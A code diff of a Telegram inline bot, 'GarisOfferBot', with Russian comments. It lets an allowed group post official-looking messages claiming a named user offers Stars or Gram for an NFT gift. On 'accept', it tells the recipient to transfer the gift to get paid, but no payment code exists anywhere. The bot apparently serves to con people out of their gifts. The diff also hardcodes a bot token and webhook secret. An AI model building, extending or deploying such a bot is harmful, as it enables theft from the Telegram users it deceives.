@@ -2,14 +2,13 @@ const ADMIN_ID = 5151757168;
 const BOT_TOKEN = "9231998177:AAGBygPUUaRla7FJujix4bE9cpYWcg4U3w0"; // ВСТАВЬ СВОЙ ТОКЕН
 const WEBHOOK_SECRET = "GarisOffer9231998"; // ТВОЙ СЕКРЕТ
 
-// ТУТ УЖЕ ВПИСАНЫ ВСЕ ТВОИ ID
+// ТУТ ВСЕ ТВОИ ID (включая новый)
 const ALLOWED_IDS = [
   5151757168, 
   9021098137, 
   1290278554, 
   883619484,
-  7903610791,
-  1976216049
+  7903610791
 ];
 const ALLOWED_USERNAMES = ["nogannopervi"];
 
@@ -38,7 +37,7 @@ export default {
         if (!isAdmin && !isAllowed) {
           text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\nВаш ID: <code>${userId}</code>`;
         } else {
-          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n👑 <b>Владелец:</b> @gwrex\n\nЧтобы отправить оффер, напишите:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>`;
+          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n👑 <b>Владелец:</b> @gwrex\n\nОтправь оффер в Stars:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>\n\nОтправь оффер в Gram:\n<code>@GarisOfferBot t.me/nft/PrettyPosy-5375 500 gram</code>`;
         }
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
       }
@@ -54,21 +53,18 @@ export default {
 
         if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });
 
-        const textQuery = iq.query.trim();
+        // Очистка от скрытых символов (защита от iPhone)
+        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
-        // Ищем сумму (последнее число)
+        // Ищем сумму
         const allNums = textQuery.match(/\d+/g); 
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
         
-        // ИСПРАВЛЕНИЕ: Ищем ссылку/название подарка, даже если есть https://
+        // Ищем ссылку/название подарка
         const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
-        
         let giftLink = "";
         if (giftMatch) {
-            let rawGift = giftMatch[0];
-            // Убираем протокол https://, если он есть
-            rawGift = rawGift.replace(/^https?:\/\//, '');
-            
+            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
             if (rawGift.startsWith("t.me")) {
                 giftLink = "https://" + rawGift;
             } else {
@@ -76,17 +72,23 @@ export default {
             }
         }
 
+        // ОПРЕДЕЛЯЕМ ВАЛЮТУ (по умолчанию Stars)
+        let currency = "⭐ Stars";
+        if (textQuery.includes("gram") || textQuery.includes("ton")) {
+            currency = "💎 Gram";
+        }
+
         let senderName = iq.from.first_name || "";
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
 
-        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
+        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currency} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
 
         const results = [{
           type: "article",
           id: "1",
           title: `Оффер от ${senderName}`,
-          description: `За ${amount} ⭐ Stars`,
+          description: `За ${amount} ${currency}`,
           input_message_content: { message_text: text, parse_mode: "HTML" },
           reply_markup: {
             inline_keyboard: [
@@ -112,17 +114,29 @@ export default {
 
           let buyerLink = buyer.username ? "https://t.me/" + buyer.username : "https://t.me/gwrex";
 
+          const messageText = cq.message.text || cq.message.caption || "";
+          
+          // Вытаскиваем сумму
+          const amountMatch = messageText.match(/(\d+)/);
+          const amount = amountMatch ? amountMatch[1] : "указанную сумму";
+
+          // ОПРЕДЕЛЯЕМ ВАЛЮТУ ИЗ СООБЩЕНИЯ (Stars или Gram)
+          let displayCurrency = "⭐ Stars";
+          if (messageText.toLowerCase().includes("gram") || messageText.toLowerCase().includes("ton")) {
+            displayCurrency = "💎 Gram";
+          }
+
           let newText = "";
           let newMarkup = { inline_keyboard: [] };
 
           if (cq.data.startsWith("acc")) {
             await callApi("answerCallbackQuery", { 
               callback_query_id: cq.id, 
-              text: "Предложение успешно принято ✅\n\nПередайте подарок, чтобы ⭐️ Stars пришли", 
+              text: `Предложение успешно принято ✅\n\nПередайте подарок, чтобы ${amount} ${displayCurrency} пришли`, 
               show_alert: true 
             });
             
-            newText = `✅ <b>Подарок продан!</b>\n\nПередайте его покупателю <b>${buyerName}</b>, чтобы получить Stars.`;
+            newText = `✅ <b>Подарок продан!</b>\n\nПередайте его покупателю <b>${buyerName}</b>, чтобы получить ${amount} ${displayCurrency}.`;
             newMarkup = { 
               inline_keyboard: [[{ text: "🎁 Передать подарок", url: buyerLink }]] 
             };
@@ -131,38 +145,22 @@ export default {
             newText = `❌ <b>Вы отказались от оффера.</b>`;
           }
 
-          // Обработка инлайн-сообщений (редактируем на месте)
           if (cq.inline_message_id) {
             try {
               if (cq.message && cq.message.caption !== undefined) {
-                await callApi("editMessageCaption", { 
-                  inline_message_id: cq.inline_message_id, 
-                  caption: newText, 
-                  parse_mode: "HTML", 
-                  reply_markup: newMarkup 
-                });
+                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
               } else {
-                await callApi("editMessageText", { 
-                  inline_message_id: cq.inline_message_id, 
-                  text: newText, 
-                  parse_mode: "HTML", 
-                  reply_markup: newMarkup 
-                });
+                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
               }
-            } catch (err) {
-              console.error("Ошибка при редактировании:", err.message);
-            }
+            } catch (err) { console.error("Ошибка при редактировании:", err.message); }
           } 
-          // Обработка обычных сообщений
           else if (cq.message) {
             const chatId = cq.message.chat.id;
             const messageId = cq.message.message_id;
             try {
               await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
               try { await callApi("deleteMessage", { chat_id: chatId, message_id: messageId }); } catch (e) {}
-            } catch (err) {
-               console.error("Ошибка отправки:", err.message);
-            }
+            } catch (err) { console.error("Ошибка отправки:", err.message); }
           }
         }
       }
@@ -184,9 +182,7 @@ async function callApi(method, body) {
       body: JSON.stringify(body)
     });
     const data = await response.json();
-    if (!data.ok) {
-      throw new Error(data.description);
-    }
+    if (!data.ok) throw new Error(data.description);
     return data;
   } catch (e) {
     console.error(`Ошибка API [${method}]:`, e.message);
